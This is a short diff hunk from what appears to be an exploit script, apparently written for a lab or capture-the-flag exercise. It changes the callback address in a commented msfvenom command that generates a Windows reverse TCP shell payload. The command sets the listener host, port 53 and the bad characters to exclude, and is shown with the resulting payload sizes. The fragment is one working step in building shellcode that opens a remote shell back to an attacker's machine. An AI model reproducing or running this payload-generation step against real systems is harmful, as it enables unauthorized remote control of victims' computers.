@@ -21,7 +21,7 @@ port = "80"
 requests = 8
 
 # SHELLCODE --
-# sudo msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.7 LPORT=53 EXITFUNC=thread -f python -b '\x00\x0a\x0d\xcc\x20'
+# sudo msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.13.40 LPORT=53 EXITFUNC=thread -f python -b '\x00\x0a\x0d\xcc\x20'
 # Payload size: 351 bytes
 # Final size of python file: 1684 bytes
 
